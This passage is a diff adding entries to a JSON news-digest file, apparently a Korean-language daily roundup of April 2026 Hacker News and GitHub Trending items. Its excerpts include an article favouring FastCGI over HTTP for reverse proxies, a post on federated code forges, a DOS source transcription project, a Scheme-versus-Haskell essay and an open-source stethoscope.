+          "slug": "warpdotdevwarp-rust",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.732Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "Rust"
+          ]
+        },
+        {
+          "title": "FastCGI: 30 years old and still the better protocol for reverse proxies",
+          "titleKo": "FastCGI: 30년 된 프로토콜이지만 여전히 리버스 프록시에 최적",
+          "summary": "리버스 프록시와 백엔드 간 통신에서 HTTP를 사용하면 요청 스머글링(desync 공격) 및 헤더 신뢰성 문제가 발생한다. FastCGI는 1996년부터 이러한 문제를 해결하며 주요 웹서버(nginx, Apache, Caddy, HAProxy)에서 지원되는 더 나은 대안이다.",
+          "keyPoints": [
+            "HTTP/1.1의 모호한 메시지 경계는 프록시와 백엔드 간 요청 경계 해석 불일치를 야기하며, 이는 Discord 미디어 프록시 사건처럼 심각한 보안 취약점이 된다.",
+            "HTTP 헤더로 클라이언트 IP나 인증 정보를 전달할 때 신뢰할 수 있는 구조가 없어 공격자가 조작한 데이터를 신뢰하기 쉽다.",
+            "FastCGI는 명확한 메시지 경계와 구조화된 메타데이터 전달로 이 문제들을 해결하며, 설정도 간단하다."
+          ],
+          "whyItMatters": "프로덕션 환경의 리버스 프록시 구성 시 보안 취약점을 피하기 위해 HTTP 대신 FastCGI 사용을 검토해야 한다.",
+          "url": "https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 208,
+          "contentType": "discussion",
+          "labels": [
+            "backend",
+            "devops"
+          ],
+          "isTopicPrimary": true,
+          "slug": "fastcgi-30-years-old-and-still-the-better-protocol-for-reverse-proxies",
+          "fullContent": "April 29, 2026FastCGI: 30 Years Old and Still the Better Protocol for Reverse Proxies\nHTTP reverse proxying is a minefield.\nJust the other week, a researcher disclosed a desync\nvulnerability in Discord's media proxy that allowed spying on private\nattachments. This is not unusual; these vulnerabilities just keep coming.\nThe problem is the widespread use of HTTP as the protocol between reverse proxies\nand backends, even though it's unfit for the job.\nBut we don't have to use HTTP here.\nThere's a 30-year-old protocol for proxy-to-backend communication\nthat avoids HTTP's pitfalls. It's called FastCGI,\nand its specification was released 30 years ago today.\nFastCGI is a Wire Protocol, not a Process Model\nIt's true that some web servers can automatically spawn FastCGI processes\nto handle requests for files with the .fcgi extension, much like they\nwould for .cgi files. But you don't have to use FastCGI this way - you\ncan also use the FastCGI protocol just like HTTP, with requests sent\nover a TCP or UNIX socket to a long-running daemon that handles them as if they\nwere HTTP requests.\nFor example, in Go all you have to do is import the\nnet/http/fcgi\nstandard library package and replace http.Serve with fcgi.Serve:\nGo HTTP\nl, _ := net.Listen(\"tcp\", \"127.0.0.1:8080\")\nhttp.Serve(l, handler)\nGo FastCGI\nl, _ := net.Listen(\"tcp\", \"127.0.0.1:8080\")\nfcgi.Serve(l, handler)\nEverything else about your app stays the same - even your handler, which continues to use the standard\nhttp.ResponseWriter and http.Request types.\nPopular proxies like Apache, Caddy, nginx, and HAProxy support FastCGI backends, and the configuration is simple:\nnginx HTTP\nproxy_pass http://localhost:8080;\nnginx FastCGI\nfastcgi_pass localhost:8080;\ninclude fastcgi_params;\nShow more config examples\nApache HTTP\nProxyPass / http://localhost:8080/\nApache FastCGI\nProxyPass / fcgi://localhost:8080/\nCaddy HTTP\nreverse_proxy localhost:8080 {\ntransport http {\n}\n}\nCaddy FastCGI\nreverse_proxy localhost:8080 {\ntransport fastcgi {\n}\n}\nHAProxy HTTP\nbackend app_backend\nserver s1 localhost:8080\nHAProxy FastCGI\nfcgi-app fcgi_app\ndocroot /\nbackend app_backend\nuse-fcgi-app fcgi_app\nserver s1 localhost:8080 proto fcgi\nWhy HTTP Sucks for Reverse Proxies: Desync Attacks / Request Smuggling\nHTTP/1.1 has the tragic property of looking simple on the surface\n(it's just text!) but actually being a nightmare to parse robustly.\nThere are so many different ways to format the same HTTP message,\nand there are too many edge cases and ambiguities for implementations to handle consistently.\nAs a result, no two HTTP/1.1 implementations\nare exactly the same, and the same message can be parsed differently by different parsers.\nThe most serious problem is that there is no explicit framing of HTTP\nmessages - the message itself describes where it ends, and there are\nmultiple ways for a message to do that, all with their own edge cases.\nImplementations can disagree about where a message ends,\nand consequently, where the next message begins. This is the foundation of\nHTTP desync attacks,\nalso known as request smuggling, wherein a reverse proxy and a backend disagree about\nthe boundaries between HTTP messages, causing all sorts of nightmare\nsecurity issues, such as the Discord vulnerability I linked above.\nA lot of people seem to think you can just patch the parser divergences,\nbut this is a losing strategy. James Kettle\njust keeps finding new ones. After\nfinding another batch last year,\nhe declared \"HTTP/1.1 must die\".\nHTTP/2, when consistently used between the proxy and backend, fixes desync by putting clear boundaries around messages, but FastCGI\nhas been doing that since 1996 with a simpler protocol.\nFor context, nginx has supported FastCGI backends since its first release,\nbut only got support for HTTP/2 backends in late 2025. Apache's support for HTTP/2 backends is still \"experimental\".\nWhy HTTP Sucks for Reverse Proxies: Untrusted Headers\nIf desync attacks were the only problem, you could just use HTTP/2 and call it\na day. Unfortunately, there's another problem: HTTP has no robust way\nfor the proxy to convey trusted information about the request, such as the real client IP address,\nauthenticated username (if the proxy handles authentication), or client certificate details\n(if mTLS is used).\nThe only option is to stick this information in HTTP headers, alongside\nthe headers proxied from the client, without a clear structural distinction between trusted\nheaders from the proxy and untrusted headers from a potential attacker.\nFor example, the X-Real-IP header is often used\nto convey the client's real IP address. In theory, if your proxy correctly deletes all instances\nof the X-Real-IP header (not just the first, and including case variations like x-REaL-ip) before adding its own, you're safe.\nIn practice, this is a minefield\nand there are an awful lot of ways your backend can end up trusting attacker-controlled data.\nYour proxy really needs to delete not just X-Real-IP, but any header that's used for",
+          "category": "tech",
+          "publishedAt": "2026-04-29T16:16:39.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Vera: a programming language designed for machines to write",
+          "titleKo": "Vera: 머신이 작성하도록 설계된 프로그래밍 언어",
+          "summary": "AI나 자동 코드 생성 시스템이 작성하기 위해 특별히 설계된 새로운 프로그래밍 언어입니다.",
+          "keyPoints": [
+            "인간이 아닌 자동 코드 생성 시스템의 효율성을 위해 최적화된 언어 설계",
+            "AI 코드 생성의 정확성과 구문 검증을 개선하는 것을 목표로 함"
+          ],
+          "whyItMatters": "AI 기반 코드 생성 기술이 발전하면서 머신 친화적 언어 설계의 새로운 패러다임을 제시합니다.",
+          "url": "https://github.com/aallan/vera",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 12,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "vera-a-programming-language-designed-for-machines-to-write",
+          "category": "tech",
+          "publishedAt": "2026-04-29T21:41:32.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "microsoft/VibeVoice (Python)",
+          "titleKo": "microsoft/VibeVoice (Python)",
+          "summary": "Microsoft의 오픈소스 음성 AI 프로젝트로, Python 기반의 음성 처리 기술을 제공한다.",
+          "keyPoints": [
+            "Microsoft에서 공개한 오픈소스 음성 AI 프로젝트이다.",
+            "Python으로 개발되어 음성 관련 작업에 활용할 수 있다."
+          ],
+          "whyItMatters": "음성 처리 관련 프로젝트를 진행할 때 Microsoft의 공개 음성 AI 기술을 활용할 수 있다.",
+          "url": "https://github.com/microsoft/VibeVoice",
+          "sourceName": "GitHub Trending",
+          "engagement": 45656,
+          "contentType": "repo",
+          "labels": [
+            "ai"
+          ],
+          "isTopicPrimary": true,
+          "slug": "microsoftvibevoice-python",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.734Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "Python"
+          ]
+        },
+        {
+          "title": "CJackHwang/ds2api (Go)",
+          "titleKo": "ds2api - Deepseek을 API로 변환하는 미들웨어",
+          "summary": "Go로 작성된 경량 고성능 미들웨어로, Deepseek을 다양한 API 형식으로 변환하며 다중 계정 로테이션, Vercel 서버리스, Docker를 지원합니다.",
+          "keyPoints": [
+            "Google, Claude, OpenAI API 형식과 호환되는 프로토콜 변환",
+            "다중 계정 로테이션 및 컴파일된 바이너리 제공",
+            "Vercel Serverless와 Docker 배포 지원"
+          ],
+          "whyItMatters": "LLM API 통합이 필요한 개발자들이 다양한 AI 모델을 통일된 인터페이스로 사용할 수 있게 합니다.",
+          "url": "https://github.com/CJackHwang/ds2api",
+          "sourceName": "GitHub Trending",
+          "engagement": 2695,
+          "contentType": "repo",
+          "labels": [
+            "backend"
+          ],
+          "isTopicPrimary": true,
+          "slug": "cjackhwangds2api-go",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.735Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "Go"
+          ]
+        },
+        {
+          "title": "1jehuang/jcode (Rust)",
+          "titleKo": "jcode - Coding Agent Harness",
+          "summary": "Rust로 작성된 코딩 에이전트 실행 환경 프레임워크입니다.",
+          "keyPoints": [
+            "AI 코딩 에이전트 구현 및 실행을 위한 하네스 제공"
+          ],
+          "whyItMatters": "AI 기반 코딩 어시스턴트 개발 시 기반이 될 수 있는 도구입니다.",
+          "url": "https://github.com/1jehuang/jcode",
+          "sourceName": "GitHub Trending",
+          "engagement": 1328,
+          "contentType": "repo",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "1jehuangjcode-rust",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.733Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "Rust"
+          ]
+        },
+        {
+          "title": "Virtualisation on Apple Silicon Macs is different",
+          "titleKo": "Apple Silicon Mac의 가상화는 다르다",
+          "summary": "Apple Silicon Mac에서의 가상화 기술이 기존 Intel 기반 Mac과 다른 방식으로 동작한다는 기술적 분석 글입니다.",
+          "keyPoints": [
+            "Apple Silicon의 아키텍처 차이로 인해 가상화 구현 방식이 근본적으로 다름",
+            "개발자는 Apple Silicon Mac에서 가상화 환경 구성 시 Intel 기반과 다른 접근이 필요"
+          ],
+          "whyItMatters": "Apple Silicon으로의 전환이 진행 중인 상황에서 개발 환경 구축과 크로스 플랫폼 호환성을 고려한 개발 전략 수립에 필수적입니다.",
+          "url": "https://eclecticlight.co/2026/04/29/virtualisation-on-apple-silicon-macs-is-different/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 57,
+          "contentType": "discussion",
+          "labels": [
+            "devops"
+          ],
+          "isTopicPrimary": true,
+          "slug": "virtualisation-on-apple-silicon-macs-is-different",
+          "category": "tech",
+          "publishedAt": "2026-04-29T16:51:38.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "insight",
+      "items": [
+        {
+          "title": "We need a federation of forges",
+          "titleKo": "우리는 포지(Forge)의 연합이 필요하다",
+          "summary": "GitHub의 중앙화 의존성을 벗어나기 위해 Tangled라는 연합형 코드 협업 플랫폼을 제안합니다. 이는 git을 코드 전송에, AT 프로토콜을 이벤트 통신에 사용하여 여러 서버 간 협업을 가능하게 합니다.",
+          "keyPoints": [
+            "GitHub의 중앙화 문제를 해결하기 위한 연합형 아키텍처 제안 - 여러 git 서버('knots')에서 협업하고 크로스 서버 포크/PR 가능",
+            "email + git, GitHub, ForgeFed, Tangled 등 코드 협업의 진화 과정 분석 - git은 코드 전송, 통신 프로토콜만 변화",
+            "AT 프로토콜을 활용한 인증된 이벤트 전송 - 이슈, PR, 팔로우, 별표 등 소셜 기능 지원"
+          ],
+          "whyItMatters": "오픈소스 생태계가 단일 벤더에 의존하는 위험을 줄이고, 자체 서버에서도 GitHub과 같은 협업 경험을 가능하게 합니다.",
+          "url": "https://blog.tangled.org/federation/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 504,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "we-need-a-federation-of-forges",
+          "fullContent": "GitHub seems to be crumbling the past couple of weeks.\nWhatever the reason, ultimately its not great for 90% of the\nworld's OSS to depend on one provider. Centralized systems\nalways crumble; it's the emails, gits, and IRCs that stand\nthe test of time. Tangled aims to fit in this space, allow\nme to explain.\nCode collaboration has always made use of two protocols, one\nfor code transfer and one for communication:\nIt began with the email flow: git (code transfer) + email\n(comms)\nThen there was GitHub: git (code transfer) + GitHub the\nwebsite (comms)\nThere is the ForgeFed project: git (code transfer) +\nmaybe\nActivityPub\n(comms)\nWe are building Tangled: git (code transfer) + AT\nprotocol (comms)\nTangled federates events among git servers (called \"knots\").\nYou can collaborate on repositories on any server and you\ncan fork across servers. You can even push to a repository\non your own server, and open a pull-request on a repo hosted\non a completely different server. In a lot of ways, this is\nquite like hosting your own cgit instance, and sending out\npatches via email.\nTangled uses AT to facilitate the Authenticated Transfer of\nevents surrounding code: like issues and pull-requests, and\nit also enables a few social bits: a timeline of events,\nfollows, stars (and vouches very soon). AT is used to share\ncollaborator invites and ssh pubkeys, but the rest is just\ngood ol' git.\nOSS needs to break free from monocultures like GitHub, but\ncode collaboration should still be fun and social.",
+          "category": "insight",
+          "publishedAt": "2026-04-29T14:00:59.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "GitHub – DOS 1.0: Transcription of Tim Paterson's DOS Printouts",
+          "titleKo": "GitHub – DOS 1.0: Tim Paterson의 DOS 인쇄본 전사",
+          "summary": "DOS의 원개발자 Tim Paterson이 인쇄한 86-DOS 1.0 및 PC-DOS 1.0의 원본 소스코드를 디지털 형식으로 전사하고 컴파일 가능한 코드로 복원한 프로젝트입니다.",
+          "keyPoints": [
+            "1981-1982년 DOS 초기 버전의 완전한 커널, 유틸리티, BASIC 라이브러리 소스코드 제공",
+            "원본 인쇄본을 스캔 → 전사 → 컴파일 가능한 소스코드로 변환하는 3단계 아카이빙 제공"
+          ],
+          "whyItMatters": "컴퓨터 역사 연구, 레거시 시스템 이해, 저수준 시스템 프로그래밍 학습에 중요한 역사적 자료입니다.",
+          "url": "https://github.com/DOS-History/Paterson-Listings",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 115,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "github-dos-10-transcription-of-tim-patersons-dos-printouts",
+          "fullContent": "Paterson Listings\nTim Paterson's DOS listings, containing source code of 86-DOS 1.00 kernel,\nvarious PC-DOS 1.00 pre-release kernels and utilities, and the Microsoft\nBASIC-86 Compiler runtime library.\nThe DOS-related portions have been transcribed and turned into compilable\nsource code.\nDownloads and Layout\n1_transcription (download) -\ntranscription of the listings, essentially the raw printer output\n2_printed_files (download) -\nthe original files that were printed, extracted from the raw printer output\nabove\n3_source_code (download) -\ncompilable source code extracted from the printed files above\nIf you just want to browse the source code or compile/assemble it, choose\n3_source_code. The original scans, in PDF and PNG\nformats, are available at https://archive.org/details/paterson_listings.\nFurther details about these listings, including technical writeups, can be\nfound at:\nhttps://thebrokenpipe.com/dos/paterson_listings\nhttp://cini.classiccmp.org/recoveryblog.htm\nhttps://jscarsbrook.me/doshistory\nListing Content\nPaterson's stack of DOS listings contains 10 bundles of continuous-feed paper,\nfrom top to bottom:\nBundle 01\n(86 pages):\nMSDOS.LST\nBundle 02\n(62 pages):\n86DOS.A86\n(created: 1981/07/07 17:06:59, printed: 1981/07/08 13:49:52)\nBundle 03\n(18 pages):\nEDLIN.DIF\n(created: 1981/07/28 14:21:18, printed: 1981/07/28 14:40:48)\nCHKDSK.A86\n(created: 1981/07/15 12:19:22, printed: 1981/07/28 14:41:25)\nBundle 04\n(58 pages):\n86DOS.ASM\n(created: 1981/06/15 03:18:51, printed: 1981/06/16 15:17:17)\nBundle 05\n(57 pages):\nASM.PRN\nBundle 06\n(71 pages):\nASM.PRN\nBundle 07\n(10 pages):\nCHKDSK.A86\n(created: 1981/06/15 04:10:28, printed: 1981/06/16 15:32:54)\nBundle 08\n(32 pages):\n86DOS.DIF\n(created: 1981/06/16 15:11:47, printed: 1981/06/16 15:13:47)\nBundle 09\n(459 pages):\nLIBLST.LOG\n(created: 1981/11/13 01:10:16, printed: 1981/11/13 01:17:42)\nBASLIB.PRT\n(created: 1981/11/13 01:09:35, printed: 1981/11/13 01:19:29)\nBundle 10\n(20 pages):\nPAINT.ASM\n(created: 1982/01/06 22:20:26, printed: 1982/02/06 20:58:03)\nCIRCLE.ASM\n(created: 1982/02/04 11:51:32, printed: 1982/02/06 20:58:44)\nBundles 9 and 10 have not yet been transcribed. If you wish to help transcribe\nthem, please submit a\npull request. Only\ncontributions that provide direct transcriptions of the listings or correct\ntypos in existing transcriptions will be merged.\nCompiling/Assembling\nMost of the sources here target Seattle Computer Products' ASM assembler, so\nyou will need a copy. It can be obtained from any release of 86-DOS or MS-DOS\nby Seattle Computer Products. You will also need the HEX2BIN utility from\nSeattle Computer Products to convert Intel HEX objects produced by the\nassembler into binaries.\nThe simplest way to assemble a source file is to run\nASM <FILENAME-NO-EXTENSION>, followed by HEX2BIN <FILENAME-NO-EXTENSION>.\nFor example, to assemble 86DOS.ASM into the binary 86DOS.COM, run:\nA:ASM 86DOS\nSeattle Computer Products 8086 Assembler Version 2.24\nCopyright 1979,80,81 by Seattle Computer Products, Inc.\nError Count = 0\nA:HEX2BIN 86DOS\nA:",
+          "category": "insight",
+          "publishedAt": "2026-04-29T11:25:12.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Soft launch of open-source code platform for government",
+          "titleKo": "정부 오픈소스 코드 플랫폼의 소프트 런칭",
+          "summary": "네덜란드 정부에서 공공 부문을 위한 오픈소스 코드 플랫폼을 정식 출시하기 전에 소프트 런칭했습니다.",
+          "keyPoints": [
+            "공공 부문의 소프트웨어 개발을 위한 중앙 집중식 오픈소스 플랫폼 도입",
+            "정부 기관 간 코드 재사용성과 투명성 증대를 목표로 함"
+          ],
+          "whyItMatters": "공공 부문 소프트웨어 개발의 투명성과 효율성 제고 사례로 정부 IT 프로젝트에 참여하는 개발자에게 의미가 있습니다.",
+          "url": "https://www.nldigitalgovernment.nl/news/soft-launch-for-government-open-source-code-platform/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 509,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "soft-launch-of-open-source-code-platform-for-government",
+          "category": "insight",
+          "publishedAt": "2026-04-29T09:14:37.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Laws of UX",
+          "titleKo": "Laws of UX",
+          "summary": "사용자 경험(UX) 설계에 적용할 수 있는 기본 원칙과 법칙들을 정리한 리소스이다.",
+          "keyPoints": [
+            "UX 설계 시 참고할 수 있는 다양한 법칙과 원칙들을 제시한다.",
+            "사용자 중심의 설계 결정을 돕는 기본 가이드라인을 제공한다."
+          ],
+          "whyItMatters": "UI/UX 개발 시 사용자 경험을 개선하기 위한 검증된 설계 원칙을 빠르게 참고할 수 있다.",
+          "url": "https://lawsofux.com/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 149,
+          "contentType": "discussion",
+          "labels": [
+            "frontend"
+          ],
+          "isTopicPrimary": true,
+          "slug": "laws-of-ux",
+          "category": "insight",
+          "publishedAt": "2026-04-29T16:58:13.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Why I still reach for Lisp and Scheme instead of Haskell",
+          "titleKo": "왜 여전히 Haskell 대신 Lisp과 Scheme을 선택하는가",
+          "summary": "개발자가 수년간 다양한 언어를 경험한 후 학문적으로 우아한 Haskell보다 실용적인 Scheme을 선호하는 이유를 설명합니다.",
+          "keyPoints": [
+            "Haskell은 뛰어난 타입 시스템과 함수형 프로그래밍 개념의 우수성을 제공하지만 프로토타이핑과 빠른 개발에는 장벽이 존재",
+            "Scheme은 Haskell의 학문적 순수성은 부족하지만 실용성과 함수형의 아름다움을 결합하여 개발자 경험을 우선시",
+            "실제 개발 시 모나드 같은 무거운 추상화의 필요성을 항상 정당화할 수 없으며, 파일 쓰기나 네트워크 통신 같은 부수 효과 처리에서 Scheme이 더 직관적"
+          ],
+          "whyItMatters": "함수형 프로그래밍 언어 선택 시 이론적 완벽성과 실제 생산성의 트레이드오프를 이해하고, 프로젝트의 실제 요구사항에 맞는 언어 선택의 중요성을 배울 수 있습니다.",
+          "url": "https://jointhefreeworld.org/blog/articles/lisps/why-i-still-reach-for-scheme-instead-of-haskell/index.html",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 143,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "why-i-still-reach-for-lisp-and-scheme-instead-of-haskell",
+          "fullContent": "There is a persistent tension in software engineering between the beautiful, mathematically pure ideal of a program, and the messy, pragmatic reality of just getting things done. Over my career, I’ve explored the depths of both extremes in an attempt to find my personal sweet spot for hacking.\nBefore you sharpen your keyboards and start a flame war over the title, let me point out that I haven’t written this post to talk bad about Haskell, or any other tool for that matter. In fact, I love Haskell. I taught myself, banged my head against the wall over the course of three years, and built several real-world projects with it (some even became a bit lucrative).\nBetween my time in the web development world, the Go world, the JVM world with Java, Scala and Kotlin, and my long history hacking in Lisp (Emacs, Common, Scheme), I have come to deeply appreciate functional programming.\nEnlightening as it can be #\nHaskell has what likely is the most amazing, enlightening and complex type system to work with (as do more ML languages).\nIt is also the undisputed king of introducing mathematical ideas and concepts to programming, and popularizing them. Haskell circles are frequented by PhDs, computer science researchers, category theorists and all kinds of smart people (don’t underestimate other communities, like Schemers though).\nSome of the amazing innovations of Haskell or that it has helped popularize, which blew my mind several times:\nalgebraic data types\npattern matching\nfunctors, monads\nmonoids, semigroups\neffectful computation modelled as monads\npurely functional domain-specific languages (DSLs)\netc.\nAll these kind of things often feel bolted-on or missing entirely in other languages!\nFor all its brilliance, Haskell resists most of the attempts people make to just hack and write useful code quickly.\nSpecially people new to functional programming (or god forbid new to monads and functors! A monad is just a monoid in the category of endofunctors, what’s the problem?)\nWhen pragmatism enables actual productivity #\nScheme (and Lisp in general) might lack Haskell’s innovations and purity, favoring a minimalistic flexibility instead, but it mixes practicality with functional beauty in a way that makes it a functional language for human beings.\nActually, in my opinion, Scheme (and Lisp) allows you to express complex systems and problem domains in more simple terms than any other language can.\nTake a recent adventure of mine, for example. I was spinning up a prototype for a bookmark management tool, just one of many projects I’ve come up with over the years.\nI started in Haskell as I thought the beauty of data modelling and pure side-effect-free reasoning would work well: it’s also fast, elegant, and once you’ve used modules like Parsec, Servant, and optparse-applicative, it’s tough to imagine writing certain things, like a parser, without it.\nOne of the steps in the proof-of-concept was transforming some data models to XML and output them to a file.\nIf I were doing this in Kotlin or Java, it would be trivial: drop a dependency into Gradle, wire up Jackson or a standard DOM parser, and ten minutes later the data is in memory and ready to manipulate.\nAfter a frustrating hour with my Haskell project, and even after years of experience with the language, I was still wrestling with the dependencies, and later with monadic API, and I ended up giving up on the whole thing after I noticed I even forgot what I was doing in the first place.\nThis has often been my friction point with Haskell. It is beautiful, but it fights you when you just want to get your hands dirty and prototype, without a big design upfront even though type-driven development can also be nice and work well in some cases.\nScheme (GNU Guile for me) doesn’t have Haskell’s brutally efficient compiler, although it is quite speedy thanks to the C foundation. What it has is the terseness, power, and more importantly, it makes the actual act of hacking a joy.\nAs elegant as Haskell’s purely functional foundation is, it can really complicate simple, crucial, impure tasks like writing to files or talking over a network.\nMonads are Haskell’s answer to this, but they often feel like a heavy abstraction tax; they allow you to write useful software, but they rarely make it intuitive or fast to prototype.\nThese kind of heavy-handed abstractions are in my opinion really beautiful, but not justifiable for most projects. Please do ask yourself, do I really need a functional effect system, is it worth the complexity and cognitive load? Do I really need the pure/impure computation strictness enforced at compile time? Remember that later, just adding a simple print somewhere is not going to work without refactor (welcome to the IO monad).\nAs a long-time Lisper, for me this is a massive barrier to usability. In many ways, you can only fix what you can observe.\nScheme happily sacrifices academic purity so you can slap a (write ...) anywhere in your code and instantly see what’s going o",
+          "category": "insight",
+          "publishedAt": "2026-04-29T08:43:17.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "At Protocol: Building the Social Internet",
+          "titleKo": "At Protocol: 소셜 인터넷 구축",
+          "summary": "분산형 소셜 네트워크 구축을 위한 At Protocol에 대한 공식 정보 사이트입니다.",
+          "keyPoints": [
+            "블록체인/분산 기술 기반의 소셜 인터넷 프로토콜 제시"
+          ],
+          "whyItMatters": "중앙화되지 않은 소셜 플랫폼 개발을 고려하는 개발자들의 필수 참고 자료입니다.",
+          "url": "https://atproto.com/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 55,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "at-protocol-building-the-social-internet",
+          "category": "insight",
+          "publishedAt": "2026-04-29T16:20:56.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "An open-source stethoscope that costs between $2.5 and $5 to produce",
+          "titleKo": "저비용 오픈소스 청진기 프로젝트",
+          "summary": "GliaX의 오픈소스 청진기는 2.5-5달러의 저비용으로 제조할 수 있으며, 연구 검증을 거쳐 의료용 금표준인 Littmann Cardiology III와 동등한 성능을 갖춘 프로젝트입니다. 3D 프린팅 기술을 활용하여 설계도를 공개적으로 제공합니다.",
+          "keyPoints": [
+            "PETG/ABS 재료를 사용한 3D 프린팅으로 100% 인필로 제조되며, CrystalSCAD와 OpenSCAD로 설계 파일 커스터마이징 가능",
+            "오픈소스 하드웨어 라이선스(TAPR OHL)로 공개되어 누구나 제조 및 개선 가능",
+            "의료 기기의 접근성을 획기적으로 낮춘 하드웨어 오픈소스 사례"
+          ],
+          "whyItMatters": "오픈소스 하드웨어의 의료 분야 적용과 3D 프린팅 기술을 통한 저비용 제조 방식을 시사합니다.",
+          "url": "https://github.com/GliaX/Stethoscope",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 167,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "an-open-source-stethoscope-that-costs-between-25-and-5-to-produce",
+          "fullContent": "Stethoscope\nThis project aims to create a research-validated stethoscope whose plans are\navailable freely and openly. The goal is for the bell to cost ~USD$1-2 to produce,\nand the rest of the stethoscope to cost approximately the same. You can see the peer-reviewed publication relating to this stethoscope's validation here:\nhttp://journals.plos.org/plosone/article?id=10.1371/journal.pone.0193087\nCurrently, the stethoscope resulting from this project functions as well as the\nmarket gold standard, the Littmann Cardiology III.\nBill of Materials\nPrinted parts:\n1 stethoscope head (head.stl)\n2 ear tubes (eartube.stl)\n1 Y-piece (y_piece.stl)\n1 Spring (spring.stl)\n1 Ring (ring.stl)\nOther hardware:\nSome vendors are suggested.\nTranslucent Silicone Rubber Tubing in US\n50cm length of Silicone tube - 8mm ID, 13mm OD, 50 durometer\n8MM ID X 13MM OD (0.315\" ID x 0.512\" OD)\n20cm length of silicone tube (cut into 10cm pieces) - 4mm ID, 8mm OD, 50 durometer\n4mm ID x 8mm OD (0.157\" ID x 0.314\" OD)\nDiaphragm: 40mm diameter cut from a report cover with approx 0.35mm plastic sheet\nIn Business Report Covers(USD$8.99)\nYou can cut the diaphragm by hand or with a stamp like this one\nEarbuds / Eartips: Any large-sized standard earbuds will do\nSilicone Earbuds 7 Pairs - Large size\nPrint Instructions\nINFILL MUST BE 100% INFILL MUST BE 100% INFILL MUST BE 100% INFILL MUST BE 100%\nUse PETG or ABS\nLayer height: 0.2mm\nUse PrusaSlicer 2.0 or above to import 3MF file\nModify filament and printer settings as needed.\nDO NOT MODIFY PRINT SETTINGS\nExport and print\nTroubleshooting\nIf the spring and eartubes do not fit well, go ahead and scale the spring as needed\nIf the head and ring do not fit well, use caution as you may be modifying the acoustics. You can scale the head a little.\nNotes\nWe do not use PLA due to deformation in heat and poor plastic quality in the spring causing early failure. PLA may be used, but the lifetime of the stethoscope will decrease significantly.\nWe do not use brims, but you may print the eartubes and Y-pieces with a brim of 2mm to ensure that none of the parts lift off.\nINFILL MUST BE 100% Otherwise, the stethoscope will not produce a correct sound!\nAssembly Instructions\nSee this instructional video for assembly instructions.\nAttach the diaphragm (40mm) to the stethoscope head.\nAttach the stethoscope head to the silicone tube.\nAttach the silicone tube to the Y-Piece.\nAttach spring to ear tubes.\nAttach the Y-piece to the ear tubes.\nAttach the ear tubes to the eartips / earbuds.\nTest the stethoscope as per the validation instructions.\nPrinting the inserts\nThe inserts are included in the manual directory. Using 8.5 x 11 (Legal) paper,\nthey can be printed at 8.25\" page width with 95% scale for the top print and\n90% scale for the bottom print using GIMP.\nThe top insert is cut at 14.5cm and again at 1cm creating two labels of 13.5cm height.\nThese inserts are printed on adhesive material.\nThe bottom insert is cut at a width of 20cm with a height cuts at 25cm, 15cm,\n13.5cm and 3.5cm creating 10cm x 20cm inserts.\nChanging and creating SCAD files\nCrystalSCAD and OpenSCAD\nwere used to create all STL files. To recreate the stethoscope head, simply do:\ngem install crystalscad\nruby source_files/stethoscope_head/stethoscope_head.rb\nThe SCAD files output from CrystalSCAD are found in source_files/stethoscope_head/output and are named as follows:\nPrintableStethoscopeHead1Assembly_output.scad - The head\nMass Manufacturing\nWe generally print 4 stethoscopes per plate to ensure that each stethoscope is created out of the same material.\nOur serial numbering system consists of two parts. The last number part is the total number of unique stethoscopes created since day 1. All numbers before that dash are spool identifiers involved in that stethoscope. For example:\n001-010 would be the tenth stethoscope made with the first spool in our inventory. If the first spool makes a total of 15 stethoscopes, then the first stethoscope of the second spool would be 002-016. If the twentieth stethoscope uses plastic from spool 002 and spool 003, it would be 002-003-020.\nOther stethoscopes\nOthers have made 3D printed stethoscopes too. 